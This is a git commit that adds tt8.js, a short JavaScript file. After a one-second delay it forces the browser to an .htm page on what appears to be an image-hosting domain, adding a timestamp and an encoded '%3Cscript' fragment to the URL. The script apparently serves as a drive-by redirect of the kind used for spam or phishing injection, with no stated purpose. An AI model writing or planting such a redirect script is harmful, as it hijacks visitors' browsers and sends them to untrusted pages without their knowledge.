55f92c94b7a19ca54486710e87df2c8d8f00abc8
iuuc <145624790+iuuc@users.noreply.github.com>
2023-12-31 09:42:39 +0800

    Create tt8.js

---
+++ tt8.js
@@ -0,0 +1,5 @@
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://xwwebimg-75050.picgzc.qpic.cn/img/76a04407066973191b76aa46a7e206c4.htm' + '?' + timestamp + '%3Cscript';
+    location.href = url;
+}, 1000);
